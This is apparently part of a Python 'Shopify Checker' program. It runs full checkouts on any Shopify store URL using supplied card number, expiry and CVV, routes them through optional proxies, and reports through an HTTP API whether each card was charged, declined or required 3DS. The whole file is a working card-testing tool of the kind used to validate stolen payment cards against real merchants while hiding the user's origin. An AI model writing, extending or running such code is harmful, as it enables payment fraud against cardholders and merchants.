        if tn in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
            receipt = submit.get("receipt", {})
            rid = receipt.get("id")
            if not rid:
                return {"status": "failed", "reason": "no_receipt_id"}
            return await self._poll_receipt(rid)

        if tn == "SubmitFailed":
            reason = extract_clean_response(submit.get("reason", "SUBMIT_FAILED"))
            return {"status": "declined", "code": reason, "message": reason}

        if tn == "SubmitRejected":
            for e in submit.get("errors", []):
                code = e.get("code", "")
                localized = e.get("localizedMessage", "")
                non_loc = e.get("nonLocalizedMessage", "")
                if code and code not in ("GENERIC_ERROR", "PAYMENT_FAILED"):
                    return {"status": "declined", "code": code, "message": localized or code}
                if localized:
                    return {"status": "declined",
                            "code": extract_clean_response(localized),
                            "message": localized}
                if non_loc:
                    return {"status": "declined",
                            "code": extract_clean_response(non_loc),
                            "message": non_loc}
            return {"status": "declined", "code": "SUBMIT_REJECTED"}

        if tn == "Throttled":
            return {"status": "retry", "reason": "throttled"}

        if tn == "CheckpointDenied":
            return {"status": "rejected", "code": "CHECKPOINT_DENIED"}

        receipt = submit.get("receipt", {})
        rid = receipt.get("id")
        if not rid:
            return {"status": "failed", "reason": "no_receipt"}
        return await self._poll_receipt(rid)

    # ─────────────────────────────────────────────────────
    # STEP 4: Poll Receipt
    # ─────────────────────────────────────────────────────
    async def _poll_receipt(self, rid):
        query = (
            "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
            "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
            "...on ProcessedReceipt{id orderIdentity{id __typename}__typename}"
            "...on ProcessingReceipt{id pollDelay __typename}"
            "...on WaitingReceipt{id pollDelay __typename}"
            "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
            "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
            "__typename}}"
        )
        for i in range(10):
            variables = {"receiptId": rid, "sessionToken": self.session_token}
            r = await self._submit_graphql(query, variables, "PollForReceipt")
            if not r:
                await asyncio.sleep(3)
                continue
            text = await r.text()
            try:
                data = json.loads(text)
            except Exception:
                await asyncio.sleep(3)
                continue

            receipt = data.get("data", {}).get("receipt", {})
            tn = receipt.get("__typename", "")

            if tn == "ProcessedReceipt":
                return {"status": "charged", "code": "ORDER_PLACED",
                        "order_id": receipt.get("orderIdentity", {}).get("id", "N/A")}

            if tn in ("ProcessingReceipt", "WaitingReceipt"):
                delay = receipt.get("pollDelay", 3)
                try:
                    delay = min(max(int(delay), 2), 10)
                except Exception:
                    delay = 3
                await asyncio.sleep(delay)
                continue

            if tn == "ActionRequiredReceipt":
                return {"status": "approved", "code": "OTP_REQUIRED",
                        "message": "3DS / OTP required"}

            if tn == "FailedReceipt":
                pe = receipt.get("processingError", {})
                code = pe.get("code", "CARD_DECLINED")
                msg = pe.get("messageUntranslated", "")
                return {"status": "declined", "code": code, "message": msg or code}

            await asyncio.sleep(3)

        return {"status": "failed", "reason": "poll_timeout"}

    # ─────────────────────────────────────────────────────
    # MAIN ENTRY
    # ─────────────────────────────────────────────────────
    async def checkout(self, cc, mon, year, cvv):
        try:
            self.set_card_country(cc)

            if not await self.visit_product():
                return {"status": "failed", "reason": "product_page_failed"}
            if not await self.add_to_cart():
                return {"status": "failed", "reason": "cart_failed"}
            if not await self.init_checkout():
                return {"status": "failed", "reason": "checkout_init_failed"}

            await asyncio.sleep(0.5)
            r1 = await self.proposal_shipping()
            if r1["status"] == "retry":
                await asyncio.sleep(2)
                r1 = await self.proposal_shipping()
            if r1["status"] not in ("ok",):
                return r1

            await asyncio.sleep(0.5)
            await self.proposal_delivery()

            await asyncio.sleep(0.5)
            r3 = await self.submit_payment(cc, mon, year, cvv)
            if r3["status"] == "retry":
                await asyncio.sleep(2)
                r3 = await self.submit_payment(cc, mon, year, cvv)
            return r3

        except asyncio.TimeoutError:
            return {"status": "failed", "reason": "timeout"}
        except aiohttp.ClientError as e:
            return {"status": "failed", "reason": f"proxy_error: {str(e)[:60]}"}
        except Exception as e:
            return {"status": "failed", "reason": f"exception: {str(e)[:80]}"}


# ============================================================
# RUN CHECK — sync entry that calls async
# ============================================================
def run_check(site, cc, proxy=None):
    parts = cc.split("|")
    if len(parts) != 4:
        return {"Response": "INVALID_FORMAT", "Price": "-", "Gateway": "Unknown"}

    proxy_url, proxy_scheme = None, None
    if proxy:
        proxy_url, proxy_scheme = build_proxy_url(proxy)
        if proxy_url is None:
            if proxy_scheme == "no_socks":
                return {"Response": "NO_SOCKS_SUPPORT", "Price": "-", "Gateway": "Unknown"}
            return {"Response": "INVALID_PROXY", "Price": "-", "Gateway": "Unknown"}

    async def _run():
        async with ShopifyAsync(site, proxy_url, proxy_scheme) as bot:
            return await bot.checkout(parts[0], parts[1], parts[2], parts[3]), bot

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result, bot = loop.run_until_complete(_run())
    except Exception as e:
        return {"Response": f"SERVER_ERROR: {str(e)[:80]}", "Price": "-", "Gateway": "Unknown"}

    # Format response
    status = result.get("status", "unknown")
    code = result.get("code", "")
    message = result.get("message", "")

    # ── Map to bot.py response strings ──
    if status == "charged":
        response_text = "ORDER_PLACED"
    elif status == "approved" and code == "OTP_REQUIRED":
        response_text = "3DS_REQUIRED"
    elif status == "declined":
        response_text = code or "CARD_DECLINED"
    elif status == "rejected":
        response_text = code or "REJECTED"
    elif status == "failed":
        response_text = extract_clean_response(result.get("reason", "FAILED"))
    else:
        response_text = code or "UNKNOWN"

    price = "0.00"
    if bot and bot.product:
        try:
            price = f"{bot.product['price']:.2f}"
        except Exception:
            pass

    gateway = "Shopify"
    if status in ("charged", "approved", "declined"):
        gateway = "Shopify Payments"

    return {
        "Response": response_text,
        "Price": price,
        "Gateway": gateway,
        "code": code,
        "label": message or response_text,
        "success": status == "charged",
        "site": site,
    }


# ============================================================
# HTTP HANDLER
# ============================================================
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send_json(self, status, payload):
        try:
            body = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type, X-API-Key")
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
            pass
        except Exception:
            pass

    def log_message(self, fmt, *args):
        sys.stderr.write(f"[{BRAND.lower()}-api] " + (fmt % args) + "\n")

    def do_OPTIONS(self):
        self._send_json(200, {"ok": True})

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query, keep_blank_values=True)

        if path in ("/", "/health"):
            self._send_json(200, {
                "status": "ok",
                "service": f"{BRAND.lower()}-api",
                "version": VERSION,
                "socks_support": HAS_SOCKS,
                "endpoints": ["/Shopify", "/shopify", "/health"],
            })
            return

        if path.lower() in ("/shopify", "/shopify/"):
            site = (qs.get("site", [""])[0] or "").strip()
            cc = (qs.get("cc", [""])[0] or "").strip()
            proxy = (qs.get("proxy", [""])[0] or "").strip()

            if not site or not cc:
                self._send_json(400, {
                    "Response": "MISSING_PARAMS",
                    "Price": "-",
                    "Gateway": "Unknown",
                })
                return

            try:
                result = run_check(site, cc, proxy or None)
                self._send_json(200, result)
            except Exception as e:
                self._send_json(500, {
                    "Response": f"SERVER_ERROR: {str(e)[:80]}",
                    "Price": "-",
                    "Gateway": "Unknown",
                })
            return

        self._send_json(404, {"error": "not found", "path": path, "brand": BRAND})

    def do_POST(self):
        self.do_GET()


# ============================================================
# SERVER
# ============================================================
def main():
    _init_db()
    host = os.environ.get("JINX_HOST", "0.0.0.0")
    port = int(os.environ.get("JINX_PORT", "8080"))

    socks_status = "✅ available" if HAS_SOCKS else "❌ install PySocks"

    server = ThreadingHTTPServer((host, port), Handler)

    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print(f"║  {BRAND} API — ULTRA PRO Shopify Checker v{VERSION}            ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"  Listening : http://{host}:{port}")
    print(f"  SOCKS     : {socks_status}")
    print(f"  Price     : ${PRICE_MIN} - ${PRICE_MAX} (mid-range)")
    print()
    print(f"  GET /Shopify?site=<url>&cc=<cc|mm|yyyy|cvv>&proxy=<optional>")
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n  Shutting down {BRAND} API...")
        server.shutdown()


if __name__ == "__main__":
    main()
